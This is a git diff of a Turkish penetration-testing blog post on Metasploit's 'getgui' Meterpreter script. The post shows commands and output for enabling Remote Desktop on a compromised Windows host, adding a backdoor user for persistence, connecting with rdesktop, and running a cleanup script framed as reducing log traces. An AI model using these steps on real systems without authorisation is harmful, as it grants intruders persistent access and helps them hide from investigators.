@@ -5,24 +5,32 @@ date: 2017-05-25 09:05:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
 - Araştırma
 tags:
 - msfconsole
-- metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- metasploit getgui script
+- Metasploit Framework getgui
+- msf rdesktop
+excerpt: Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için ```getgui``` komutu oldukça kullanışlıdır.
 ---
 
-Enabling Remote Desktop
-Let’s look at another situation where Metasploit makes it very easy to backdoor the system using nothing more than built-in system tools. We will utilize Carlos Perez’s ‘getgui’ script, which enables Remote Desktop and creates a user account for you to log into it with. Utilization of this script could not be easier.
+Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için ```getgui``` komutu oldukça kullanışlıdır.
 
+Bu yazımızda ```getgui``` komutunu kullanarak sistemde bir kullanıcı oluşturup ardından ```rdesktop``` komutu ile bu bilgisayara nasıl bağlanabileceğimizi göreceğiz.
+
+# Uzak Masaüstü Bağlantısı
+
+Hedef bilgisayarda Meterpreter shell açtığınızı varsayıyoruz. Şimdi işe ```getgui``` komutunu kullanarak görsel bağlantı sağlamak için gerekli olan kullanıcı adı ve parolaya ihtiyacımız var. Böyle bir kullanıcı adı ve parolası oluşturduğunuzda kalıcılık sağlamış olursunuz.
+
+## ```getgui``` Aracı
+
+Öncelikle ```getgui``` yardım başlıklarına bakalım.
+
+```sh
 meterpreter > run getgui -h
 Windows Remote Desktop Enabler Meterpreter Script
 Usage: getgui -u  -p 
@@ -36,7 +44,12 @@ OPTIONS:
     -l   The language switch
          Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
     -p   The Password of the user
+```
+## ```getgui``` Kullanıcı Ekleme
 
+Genel olarak kullanımda ```-u``` kullanıcı adını, ```-p``` parolayı belirtmek için kullanılır. ```getgui``` komutunu aşağıdaki örneğe benzer şekilde kullandığınızda sisteme yeni bir kullanıcı eklemiş olursunuz. 
+
+```sh
 meterpreter > run getgui -u loneferret -p password
 [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
 [*] Carlos Perez carlos_perez@darkoperator.com
@@ -49,21 +62,26 @@ meterpreter > run getgui -u loneferret -p password
 [*] You can now login with the created user
 [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
 meterpreter >
+```
 
-And we are done! That is it. Let’s test the connection to see if it can really be that easy.
+## ```rdesktop``` Bağlantısı
 
+Artık kullanıcı oluşturuldu. Aynı ağda bulunan başka bir bilgisayardan, bu kullanıcı adı ve parolayı kullanarak uzak masaüstü bağlantısı yapabilirsiniz. 
 
+```sh
 root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108
+```
 
+# Log Temizleme
 
-And here we see that it is. We used the ‘rdesktop’ command and specified the username and password we want to use for the log in. We then received an error message letting us know a user was already logged into the console of the system, and that if we continue, that user will be disconnected. This is expected behavior for a Windows XP desktop system, so we can see everything is working as expected. Note that Windows Server allows concurrent graphical logons so you may not encounter this warning message.
+Hedef sistemde ne kadar çok oynama yaparsanız, log kayıtlarına kaydedilme ihtimaliniz de o kadar artar. Bu sebeple mümkün olduğunca yetkisiz işlem yapmamalı veya gereken yerlere müdahale etmekle yetinmelisiniz. 
 
-Remember, these sorts of changes can be very powerful. However, use that power wisely, as all of these steps alter the systems in ways that can be used by investigators to track what sort of actions were taken on the system. The more changes that are made, the more evidence you leave behind.
+```getgui``` ile oluşturduğunuz kullanıcı ve oturum bilgilerini log kayıtların temizlemek isteyebilirsiniz. Bunun için aşağıdaki komut örneği işinize yarayacaktır. Örnekte kullanılan ```/root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc``` dosyasının en güncel halini yine aynı klasör içinden kontrol edebilirsiniz. 
 
-When you are done with the current system, you will want to run the cleanup script provided to removed the added account.
-
+```sh
 meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
 [*] Running Command List ...
 [*]   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
 Process 288 created.
 meterpreter >
+```
